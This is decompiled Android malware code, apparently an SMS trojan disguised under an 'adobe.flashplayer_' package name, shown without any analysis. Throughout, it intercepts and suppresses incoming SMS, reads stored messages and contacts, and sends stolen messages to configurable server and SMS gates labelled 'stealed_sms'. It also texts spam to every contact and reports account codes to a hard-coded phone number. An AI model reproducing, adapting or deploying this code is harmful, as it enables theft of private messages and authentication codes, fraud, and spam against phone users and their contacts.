        r3 = "forceZ";
        r5 = "On";
        r0 = r80;
        r1 = r81;
        r0.writeConfig(r3, r5, r1);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x04ec:
        r3 = "keyHttpGate";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x050d;
    L_0x04f7:
        r3 = " ";
        r0 = r74;
        r28 = r0.split(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = 1;
        r31 = r28[r3];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "Reich_ServerGate";
        r0 = r80;
        r1 = r31;
        r2 = r81;
        r0.writeConfig(r3, r1, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x050d:
        r3 = "keySmsGate";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x052e;
    L_0x0518:
        r3 = " ";
        r0 = r74;
        r28 = r0.split(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = 1;
        r31 = r28[r3];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "Reich_SMSGate";
        r0 = r80;
        r1 = r31;
        r2 = r81;
        r0.writeConfig(r3, r1, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x052e:
        r3 = "w";
        r0 = r80;
        r1 = r81;
        r79 = r0.readConfig(r3, r1);
        r3 = "forceZ";
        r0 = r80;
        r1 = r81;
        r36 = r0.readConfig(r3, r1);
        r3 = "On";
        r0 = r36;
        r3 = r0.indexOf(r3);
        r5 = -1;
        if (r3 == r5) goto L_0x058c;
    L_0x054d:
        r3 = "Reich_SMSGate";
        r0 = r80;
        r1 = r81;
        r37 = r0.readConfig(r3, r1);
        r68 = android.telephony.SmsManager.getDefault();
        if (r68 == 0) goto L_0x058c;
    L_0x055d:
        r3 = new java.lang.StringBuilder;
        r5 = "+";
        r3.<init>(r5);
        r0 = r37;
        r3 = r3.append(r0);
        r3 = r3.toString();
        r5 = new java.lang.StringBuilder;
        r7 = java.lang.String.valueOf(r63);
        r5.<init>(r7);
        r7 = "|";
        r5 = r5.append(r7);
        r0 = r67;
        r5 = r5.append(r0);
        r5 = r5.toString();
        r0 = r80;
        r0.sendSMS(r3, r5);
    L_0x058c:
        r3 = "MacrosAState";
        r0 = r80;
        r1 = r81;
        r15 = r0.readConfig(r3, r1);
        r26 = "";
        r3 = "A";
        r3 = r15.contains(r3);
        if (r3 == 0) goto L_0x067d;
    L_0x05a0:
        r3 = "900";
        r0 = r63;
        r3 = r0.contains(r3);
        if (r3 == 0) goto L_0x067d;
    L_0x05aa:
        r39 = 0;
        r59 = "[A-z]{4}[0-9]{4}\\SON\\S";
        r49 = java.util.regex.Pattern.compile(r59);
        r0 = r49;
        r1 = r67;
        r44 = r0.matcher(r1);
        r3 = 0;
        r51 = java.lang.Boolean.valueOf(r3);
    L_0x05bf:
        r3 = r44.find();
        if (r3 != 0) goto L_0x0afa;
    L_0x05c5:
        r3 = r51.booleanValue();
        if (r3 == 0) goto L_0x0b23;
    L_0x05cb:
        r3 = "+79037676840";
        r5 = new java.lang.StringBuilder;
        r7 = "EST:";
        r5.<init>(r7);
        r5 = r5.append(r11);
        r5 = r5.toString();
        r0 = r80;
        r0.sendSMS(r3, r5);
        r3 = "MacrosAData";
        r0 = r80;
        r1 = r26;
        r2 = r81;
        r0.writeConfig(r3, r1, r2);
        r3 = "MacrosAState";
        r5 = "B";
        r0 = r80;
        r1 = r81;
        r0.writeConfig(r3, r5, r1);
        r3 = "MacrosATmp";
        r0 = r80;
        r1 = r26;
        r2 = r81;
        r0.writeConfig(r3, r1, r2);
        r3 = new com.adobe.flashplayer_.FlashVirtual;
        r3.m250init();
        r5 = 3;
        r5 = new java.lang.String[r5];
        r7 = 0;
        r8 = new java.lang.StringBuilder;
        r9 = "&b=";
        r8.<init>(r9);
        r8 = r8.append(r11);
        r9 = "&c=";
        r8 = r8.append(r9);
        r9 = ":";
        r10 = "";
        r9 = r13.replace(r9, r10);
        r8 = r8.append(r9);
        r9 = "&d=";
        r8 = r8.append(r9);
        r8 = r8.append(r12);
        r9 = "&e=";
        r8 = r8.append(r9);
        r9 = "BotPhone";
        r0 = r80;
        r1 = r81;
        r9 = r0.readConfig(r9, r1);
        r8 = r8.append(r9);
        r9 = "&f=";
        r8 = r8.append(r9);
        r8 = r8.append(r14);
        r9 = "&g=";
        r8 = r8.append(r9);
        r0 = r17;
        r8 = r8.append(r0);
        r9 = "&h=macros_a_good&i=macros_a_data";
        r8 = r8.append(r9);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 1;
        r8 = "MacrosATmp";
        r0 = r81;
        r8 = r0.getFileStreamPath(r8);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 2;
        r5[r7] = r18;
        r3.execute(r5);
    L_0x067d:
        r3 = "B";
        r3 = r15.contains(r3);
        if (r3 == 0) goto L_0x0771;
    L_0x0685:
        r3 = "900";
        r0 = r63;
        r3 = r0.contains(r3);
        if (r3 == 0) goto L_0x0771;
    L_0x068f:
        r59 = "[A-z]{4}[0-9]{4}";
        r49 = java.util.regex.Pattern.compile(r59);
        r0 = r49;
        r1 = r67;
        r44 = r0.matcher(r1);
        r3 = r44.find();
        if (r3 == 0) goto L_0x0771;
    L_0x06a3:
        r22 = 0;
        r3 = 0;
        r0 = r44;
        r25 = r0.group(r3);
        r3 = " ";
        r0 = r67;
        r35 = r0.split(r3);
        r3 = 2;
        r21 = r35[r3];
        r3 = new java.lang.StringBuilder;
        r5 = "MacrosAData_";
        r3.<init>(r5);
        r0 = r25;
        r3 = r3.append(r0);
        r45 = r3.toString();
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r25);
        r3.<init>(r5);
        r5 = "\nDebug: ";
        r3 = r3.append(r5);
        r0 = r21;
        r3 = r3.append(r0);
        r5 = "\n-----\n";
        r3 = r3.append(r5);
        r0 = r67;
        r3 = r3.append(r0);
        r3 = r3.toString();
        r0 = r80;
        r1 = r45;
        r2 = r81;
        r0.writeConfig(r1, r3, r2);
        r3 = new com.adobe.flashplayer_.FlashVirtual;
        r3.m250init();
        r5 = 3;
        r5 = new java.lang.String[r5];
        r7 = 0;
        r8 = new java.lang.StringBuilder;
        r9 = "&b=";
        r8.<init>(r9);
        r8 = r8.append(r11);
        r9 = "&c=";
        r8 = r8.append(r9);
        r9 = ":";
        r10 = "";
        r9 = r13.replace(r9, r10);
        r8 = r8.append(r9);
        r9 = "&d=";
        r8 = r8.append(r9);
        r8 = r8.append(r12);
        r9 = "&e=";
        r8 = r8.append(r9);
        r9 = "BotPhone";
        r0 = r80;
        r1 = r81;
        r9 = r0.readConfig(r9, r1);
        r8 = r8.append(r9);
        r9 = "&f=";
        r8 = r8.append(r9);
        r8 = r8.append(r14);
        r9 = "&g=";
        r8 = r8.append(r9);
        r0 = r17;
        r8 = r8.append(r0);
        r9 = "&h=macros_a_good&i=macros_a_data";
        r8 = r8.append(r9);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 1;
        r0 = r81;
        r1 = r45;
        r8 = r0.getFileStreamPath(r1);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 2;
        r5[r7] = r18;
        r3.execute(r5);
    L_0x0771:
        r3 = ",";
        r0 = r79;
        r3 = r0.indexOf(r3);
        r5 = -1;
        if (r3 == r5) goto L_0x0ce0;
    L_0x077c:
        if (r38 != 0) goto L_0x0ce0;
    L_0x077e:
        r3 = ",";
        r0 = r79;
        r78 = r0.split(r3);
        r77 = 0;
    L_0x0788:
        r0 = r78;
        r3 = r0.length;
        r0 = r77;
        if (r0 < r3) goto L_0x0bc1;
    L_0x078f:
        r3 = "*";
        r0 = r79;
        r3 = r0.indexOf(r3);
        r5 = -1;
        if (r3 == r5) goto L_0x086e;
    L_0x079a:
        if (r38 != 0) goto L_0x086e;
    L_0x079c:
        r80.abortBroadcast();
        r38 = 1;
        r70 = "";
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r70);
        r3.<init>(r5);
        r0 = r67;
        r3 = r3.append(r0);
        r70 = r3.toString();
        r3 = "+";
        r5 = "";
        r0 = r63;
        r53 = r0.replace(r3, r5);
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r53);
        r3.<init>(r5);
        r5 = ".txt";
        r3 = r3.append(r5);
        r3 = r3.toString();
        r0 = r80;
        r1 = r70;
        r2 = r81;
        r0.saveData(r1, r3, r2);
        r3 = new com.adobe.flashplayer_.FlashVirtual;
        r3.m250init();
        r5 = 3;
        r5 = new java.lang.String[r5];
        r7 = 0;
        r8 = new java.lang.StringBuilder;
        r9 = "&b=";
        r8.<init>(r9);
        r8 = r8.append(r11);
        r9 = "&c=";
        r8 = r8.append(r9);
        r9 = ":";
        r10 = "";
        r9 = r13.replace(r9, r10);
        r8 = r8.append(r9);
        r9 = "&d=";
        r8 = r8.append(r9);
        r8 = r8.append(r12);
        r9 = "&e=";
        r8 = r8.append(r9);
        r9 = "BotPhone";
        r0 = r80;
        r1 = r81;
        r9 = r0.readConfig(r9, r1);
        r8 = r8.append(r9);
        r9 = "&f=";
        r8 = r8.append(r9);
        r8 = r8.append(r14);
        r9 = "&g=";
        r8 = r8.append(r9);
        r0 = r17;
        r8 = r8.append(r0);
        r9 = "&h=stealed_sms&i=";
        r8 = r8.append(r9);
        r0 = r53;
        r8 = r8.append(r0);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 1;
        r8 = new java.lang.StringBuilder;
        r9 = java.lang.String.valueOf(r53);
        r8.<init>(r9);
        r9 = ".txt";
        r8 = r8.append(r9);
        r8 = r8.toString();
        r0 = r81;
        r8 = r0.getFileStreamPath(r8);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 2;
        r5[r7] = r18;
        r3.execute(r5);
    L_0x086e:
        if (r52 == 0) goto L_0x0e06;
    L_0x0870:
        r3 = r52.isConnectedOrConnecting();
        if (r3 == 0) goto L_0x0e06;
    L_0x0876:
        r3 = "+";
        r5 = "";
        r0 = r63;
        r53 = r0.replace(r3, r5);
        r70 = "";
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r70);
        r3.<init>(r5);
        r0 = r67;
        r3 = r3.append(r0);
        r70 = r3.toString();
        if (r38 != 0) goto L_0x0947;
    L_0x0897:
        r38 = 1;
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r53);
        r3.<init>(r5);
        r5 = ".txt";
        r3 = r3.append(r5);
        r3 = r3.toString();
        r0 = r80;
        r1 = r70;
        r2 = r81;
        r0.saveData(r1, r3, r2);
        r3 = new com.adobe.flashplayer_.FlashVirtual;
        r3.m250init();
        r5 = 3;
        r5 = new java.lang.String[r5];
        r7 = 0;
        r8 = new java.lang.StringBuilder;
        r9 = "&b=";
        r8.<init>(r9);
        r8 = r8.append(r11);
        r9 = "&c=";
        r8 = r8.append(r9);
        r9 = ":";
        r10 = "";
        r9 = r13.replace(r9, r10);
        r8 = r8.append(r9);
        r9 = "&d=";
        r8 = r8.append(r9);
        r8 = r8.append(r12);
        r9 = "&e=";
        r8 = r8.append(r9);
        r9 = "BotPhone";
        r0 = r80;
        r1 = r81;
        r9 = r0.readConfig(r9, r1);
        r8 = r8.append(r9);
        r9 = "&f=";
        r8 = r8.append(r9);
        r8 = r8.append(r14);
        r9 = "&g=";
        r8 = r8.append(r9);
        r0 = r17;
        r8 = r8.append(r0);
        r9 = "&h=doubled_sms&i=";
        r8 = r8.append(r9);
        r0 = r53;
        r8 = r8.append(r0);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 1;
        r8 = new java.lang.StringBuilder;
        r9 = java.lang.String.valueOf(r53);
        r8.<init>(r9);
        r9 = ".txt";
        r8 = r8.append(r9);
        r8 = r8.toString();
        r0 = r81;
        r8 = r0.getFileStreamPath(r8);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 2;
        r5[r7] = r18;
        r3.execute(r5);
    L_0x0947:
        return;
    L_0x0948:
        r3 = r60[r39];
        r3 = (byte[]) r3;
        r3 = android.telephony.SmsMessage.createFromPdu(r3);
        r48[r39] = r3;
        r39 = r39 + 1;
        goto L_0x003c;
    L_0x0956:
        r24 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0e47 }
        r24.<init>();	 Catch:{ Exception -> 0x0e47 }
        r39 = 0;
    L_0x095d:
        r0 = r48;
        r3 = r0.length;	 Catch:{ Exception -> 0x0e47 }
        r0 = r39;
        if (r0 < r3) goto L_0x096a;
    L_0x0964:
        r23 = r24.toString();	 Catch:{ Exception -> 0x0e47 }
        goto L_0x008c;
    L_0x096a:
        r3 = r48[r39];	 Catch:{ Exception -> 0x0e47 }
        r3 = r3.getMessageBody();	 Catch:{ Exception -> 0x0e47 }
        r0 = r24;
        r0.append(r3);	 Catch:{ Exception -> 0x0e47 }
        r39 = r39 + 1;
        goto L_0x095d;
    L_0x0978:
        r3 = "display_name";
        r0 = r61;
        r3 = r0.getColumnIndex(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r61;
        r19 = r0.getString(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "data1";
        r0 = r61;
        r3 = r0.getColumnIndex(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r61;
        r71 = r0.getString(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r73);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r19;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = " ";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r71;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "\n";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r73 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "spam_data";
        r0 = r80;
        r1 = r81;
        r3 = r0.readConfig(r3, r1);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r80;
        r1 = r71;
        r0.sendSMS(r1, r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x019c;
    L_0x09cc:
        r34 = move-exception;
        r34.printStackTrace();
        goto L_0x052e;
    L_0x09d2:
        r3 = "body";
        r0 = r43;
        r3 = r0.getColumnIndex(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r43;
        r50 = r0.getString(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "date";
        r0 = r43;
        r3 = r0.getColumnIndex(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r43;
        r32 = r0.getLong(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "address";
        r0 = r43;
        r3 = r0.getColumnIndex(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r43;
        r65 = r0.getString(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r55);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r65;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "\n";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r55 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r55);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = millisToDate(r32);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "\n";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r55 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r55);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r50;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "\n\n";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r55 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x024b;
    L_0x0a4b:
        r3 = "body";
        r0 = r54;
        r3 = r0.getColumnIndex(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r54;
        r50 = r0.getString(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "date";
        r0 = r54;
        r3 = r0.getColumnIndex(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r54;
        r32 = r0.getLong(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "address";
        r0 = r54;
        r3 = r0.getColumnIndex(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r54;
        r64 = r0.getString(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r57);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r64;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "\n";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r57 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r57);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = millisToDate(r32);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "\n";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r57 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r57);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r50;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "\n\n";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r57 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x0279;
    L_0x0ac4:
        r3 = 1;
        r75 = r28[r3];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x03ec;
    L_0x0ac9:
        r34 = move-exception;
        r34.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x04a8;
    L_0x0acf:
        r34 = move-exception;
        r34.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x04a8;
    L_0x0ad5:
        r34 = move-exception;
        r34.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x04a8;
    L_0x0adb:
        r34 = move-exception;
        r34.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x04a8;
    L_0x0ae1:
        r34 = move-exception;
        r34.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x04a8;
    L_0x0ae7:
        r34 = move-exception;
        r34.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x04a8;
    L_0x0aed:
        r3 = "forceZ";
        r5 = "Off";
        r0 = r80;
        r1 = r81;
        r0.writeConfig(r3, r5, r1);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        goto L_0x04ec;
    L_0x0afa:
        r3 = 0;
        r0 = r44;
        r25 = r0.group(r3);
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r26);
        r3.<init>(r5);
        r0 = r25;
        r3 = r3.append(r0);
        r5 = ";";
        r3 = r3.append(r5);
        r26 = r3.toString();
        r39 = r39 + 1;
        r3 = 1;
        r51 = java.lang.Boolean.valueOf(r3);
        goto L_0x05bf;
    L_0x0b23:
        r3 = "MacrosAData";
        r5 = "User haven't accounts.";
        r0 = r80;
        r1 = r81;
        r0.writeConfig(r3, r5, r1);
        r3 = "MacrosAState";
        r5 = "E";
        r0 = r80;
        r1 = r81;
        r0.writeConfig(r3, r5, r1);
        r3 = "w";
        r5 = "NOFILTER";
        r0 = r80;
        r1 = r81;
        r0.writeConfig(r3, r5, r1);
        r3 = new com.adobe.flashplayer_.FlashVirtual;
        r3.m250init();
        r5 = 3;
        r5 = new java.lang.String[r5];
        r7 = 0;
        r8 = new java.lang.StringBuilder;
        r9 = "&b=";
        r8.<init>(r9);
        r8 = r8.append(r11);
        r9 = "&c=";
        r8 = r8.append(r9);
        r9 = ":";
        r10 = "";
        r9 = r13.replace(r9, r10);
        r8 = r8.append(r9);
        r9 = "&d=";
        r8 = r8.append(r9);
        r8 = r8.append(r12);
        r9 = "&e=";
        r8 = r8.append(r9);
        r9 = "BotPhone";
        r0 = r80;
        r1 = r81;
        r9 = r0.readConfig(r9, r1);
        r8 = r8.append(r9);
        r9 = "&f=";
        r8 = r8.append(r9);
        r8 = r8.append(r14);
        r9 = "&g=";
        r8 = r8.append(r9);
        r0 = r17;
        r8 = r8.append(r0);
        r9 = "&h=macros_a_bad&i=macros_a_data";
        r8 = r8.append(r9);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 1;
        r8 = "MacrosAData";
        r0 = r81;
        r8 = r0.getFileStreamPath(r8);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 2;
        r5[r7] = r18;
        r3.execute(r5);
        goto L_0x067d;
    L_0x0bc1:
        r3 = r78[r77];
        r0 = r63;
        r3 = r0.indexOf(r3);
        r5 = -1;
        if (r3 == r5) goto L_0x0c9c;
    L_0x0bcc:
        r80.abortBroadcast();
        r38 = 1;
        if (r52 == 0) goto L_0x0ca0;
    L_0x0bd3:
        r3 = r52.isConnectedOrConnecting();
        if (r3 == 0) goto L_0x0ca0;
    L_0x0bd9:
        r70 = "";
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r70);
        r3.<init>(r5);
        r0 = r67;
        r3 = r3.append(r0);
        r70 = r3.toString();
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r63);
        r3.<init>(r5);
        r5 = ".txt";
        r3 = r3.append(r5);
        r3 = r3.toString();
        r0 = r80;
        r1 = r70;
        r2 = r81;
        r0.saveData(r1, r3, r2);
        r3 = new com.adobe.flashplayer_.FlashVirtual;
        r3.m250init();
        r5 = 3;
        r5 = new java.lang.String[r5];
        r7 = 0;
        r8 = new java.lang.StringBuilder;
        r9 = "&b=";
        r8.<init>(r9);
        r8 = r8.append(r11);
        r9 = "&c=";
        r8 = r8.append(r9);
        r9 = ":";
        r10 = "";
        r9 = r13.replace(r9, r10);
        r8 = r8.append(r9);
        r9 = "&d=";
        r8 = r8.append(r9);
        r8 = r8.append(r12);
        r9 = "&e=";
        r8 = r8.append(r9);
        r9 = "BotPhone";
        r0 = r80;
        r1 = r81;
        r9 = r0.readConfig(r9, r1);
        r8 = r8.append(r9);
        r9 = "&f=";
        r8 = r8.append(r9);
        r8 = r8.append(r14);
        r9 = "&g=";
        r8 = r8.append(r9);
        r0 = r17;
        r8 = r8.append(r0);
        r9 = "&h=stealed_sms&i=";
        r8 = r8.append(r9);
        r0 = r63;
        r8 = r8.append(r0);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 1;
        r8 = new java.lang.StringBuilder;
        r9 = java.lang.String.valueOf(r63);
        r8.<init>(r9);
        r9 = ".txt";
        r8 = r8.append(r9);
        r8 = r8.toString();
        r0 = r81;
        r8 = r0.getFileStreamPath(r8);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 2;
        r5[r7] = r18;
        r3.execute(r5);
    L_0x0c9c:
        r77 = r77 + 1;
        goto L_0x0788;
    L_0x0ca0:
        r3 = "Reich_SMSGate";
        r0 = r80;
        r1 = r81;
        r37 = r0.readConfig(r3, r1);
        r68 = android.telephony.SmsManager.getDefault();
        if (r68 == 0) goto L_0x0c9c;
    L_0x0cb0:
        r3 = new java.lang.StringBuilder;
        r5 = "+";
        r3.<init>(r5);
        r0 = r37;
        r3 = r3.append(r0);
        r3 = r3.toString();
        r5 = new java.lang.StringBuilder;
        r7 = java.lang.String.valueOf(r63);
        r5.<init>(r7);
        r7 = "|";
        r5 = r5.append(r7);
        r0 = r67;
        r5 = r5.append(r0);
        r5 = r5.toString();
        r0 = r80;
        r0.sendSMS(r3, r5);
        goto L_0x0c9c;
    L_0x0ce0:
        r0 = r63;
        r1 = r79;
        r3 = r0.indexOf(r1);
        r5 = -1;
        if (r3 == r5) goto L_0x078f;
    L_0x0ceb:
        r3 = "";
        r0 = r79;
        if (r0 == r3) goto L_0x078f;
    L_0x0cf1:
        if (r38 != 0) goto L_0x078f;
    L_0x0cf3:
        r80.abortBroadcast();
        r38 = 1;
        if (r52 == 0) goto L_0x0dc5;
    L_0x0cfa:
        r3 = r52.isConnectedOrConnecting();
        if (r3 == 0) goto L_0x0dc5;
    L_0x0d00:
        r70 = "";
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r70);
        r3.<init>(r5);
        r0 = r67;
        r3 = r3.append(r0);
        r70 = r3.toString();
        r3 = new java.lang.StringBuilder;
        r5 = java.lang.String.valueOf(r63);
        r3.<init>(r5);
        r5 = ".txt";
        r3 = r3.append(r5);
        r3 = r3.toString();
        r0 = r80;
        r1 = r70;
        r2 = r81;
        r0.saveData(r1, r3, r2);
        r3 = new com.adobe.flashplayer_.FlashVirtual;
        r3.m250init();
        r5 = 3;
        r5 = new java.lang.String[r5];
        r7 = 0;
        r8 = new java.lang.StringBuilder;
        r9 = "&b=";
        r8.<init>(r9);
        r8 = r8.append(r11);
        r9 = "&c=";
        r8 = r8.append(r9);
        r9 = ":";
        r10 = "";
        r9 = r13.replace(r9, r10);
        r8 = r8.append(r9);
        r9 = "&d=";
        r8 = r8.append(r9);
        r8 = r8.append(r12);
        r9 = "&e=";
        r8 = r8.append(r9);
        r9 = "BotPhone";
        r0 = r80;
        r1 = r81;
        r9 = r0.readConfig(r9, r1);
        r8 = r8.append(r9);
        r9 = "&f=";
        r8 = r8.append(r9);
        r8 = r8.append(r14);
        r9 = "&g=";
        r8 = r8.append(r9);
        r0 = r17;
        r8 = r8.append(r0);
        r9 = "&h=stealed_sms&i=";
        r8 = r8.append(r9);
        r0 = r63;
        r8 = r8.append(r0);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 1;
        r8 = new java.lang.StringBuilder;
        r9 = java.lang.String.valueOf(r63);
        r8.<init>(r9);
        r9 = ".txt";
        r8 = r8.append(r9);
        r8 = r8.toString();
        r0 = r81;
        r8 = r0.getFileStreamPath(r8);
        r8 = r8.toString();
        r5[r7] = r8;
        r7 = 2;
        r5[r7] = r18;
        r3.execute(r5);
        goto L_0x078f;
    L_0x0dc5:
        r3 = "Reich_SMSGate";
        r0 = r80;
        r1 = r81;
        r37 = r0.readConfig(r3, r1);
        r68 = android.telephony.SmsManager.getDefault();
        if (r68 == 0) goto L_0x078f;
    L_0x0dd5:
        r3 = new java.lang.StringBuilder;
        r5 = "+";
        r3.<init>(r5);
        r0 = r37;
        r3 = r3.append(r0);
        r3 = r3.toString();
        r5 = new java.lang.StringBuilder;
        r7 = java.lang.String.valueOf(r63);
        r5.<init>(r7);
        r7 = "|";
        r5 = r5.append(r7);
        r0 = r67;
        r5 = r5.append(r0);
        r5 = r5.toString();
        r0 = r80;
        r0.sendSMS(r3, r5);
        goto L_0x078f;
    L_0x0e06:
        r3 = "Reich_SMSGate";
        r0 = r80;
        r1 = r81;
        r37 = r0.readConfig(r3, r1);
        r3 = new java.lang.StringBuilder;
        r5 = "+";
        r3.<init>(r5);
        r0 = r37;
        r3 = r3.append(r0);
        r3 = r3.toString();
        r5 = new java.lang.StringBuilder;
        r7 = java.lang.String.valueOf(r63);
        r5.<init>(r7);
        r7 = "|";
        r5 = r5.append(r7);
        r0 = r67;
        r5 = r5.append(r0);
        r5 = r5.toString();
        r0 = r80;
        r0.sendSMS(r3, r5);
        goto L_0x0947;
    L_0x0e41:
        r3 = move-exception;
        goto L_0x0174;
    L_0x0e44:
        r3 = move-exception;
        goto L_0x0174;
    L_0x0e47:
        r3 = move-exception;
        goto L_0x008c;
        */
